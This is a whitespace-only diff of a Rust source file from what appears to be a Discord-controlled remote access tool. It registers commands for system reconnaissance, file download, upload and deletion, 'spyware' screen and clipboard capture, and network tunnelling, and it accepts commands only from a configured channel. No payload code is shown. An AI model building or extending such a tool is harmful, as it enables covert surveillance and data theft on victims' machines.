@@ -84,39 +84,39 @@ macro_rules! checked_reply {
 }
 
 pub const COMMANDS: &[fn() -> poise::Command<crate::Data, crate::Error>] = &[
-    utils::help,
-    utils::clear,
-    recon::config,
-    recon::users,
-    recon::sysinfo,
-    recon::ifconfig,
-    recon::env,
-    process::ps,
-    process::pwd,
-    process::cd,
-    process::ls,
-    io::download,
-    io::upload,
-    io::cat,
-    io::write,
-    io::mkdir,
-    io::rm,
-    spyware::screen,
-    spyware::clipboard,
-    network::tunnel,
+	utils::help,
+	utils::clear,
+	recon::config,
+	recon::users,
+	recon::sysinfo,
+	recon::ifconfig,
+	recon::env,
+	process::ps,
+	process::pwd,
+	process::cd,
+	process::ls,
+	io::download,
+	io::upload,
+	io::cat,
+	io::write,
+	io::mkdir,
+	io::rm,
+	spyware::screen,
+	spyware::clipboard,
+	network::tunnel,
 ];
 
 /// Check which should be applied to all commands coming from the command chanel
 pub async fn command_channel_check(ctx: RuscordContext<'_>) -> RuscordResult<bool> {
-    let invocation_cid = ctx.channel_id();
-    let data = ctx.data();
-    let command_cid = {
-        let guard = data.config.read().await;
-        guard.command_channel_id.id()
-    };
+	let invocation_cid = ctx.channel_id();
+	let data = ctx.data();
+	let command_cid = {
+		let guard = data.config.read().await;
+		guard.command_channel_id.id()
+	};
 
-    if invocation_cid != command_cid {
-        return Ok(false);
-    }
-    Ok(true)
+	if invocation_cid != command_cid {
+		return Ok(false);
+	}
+	Ok(true)
 }
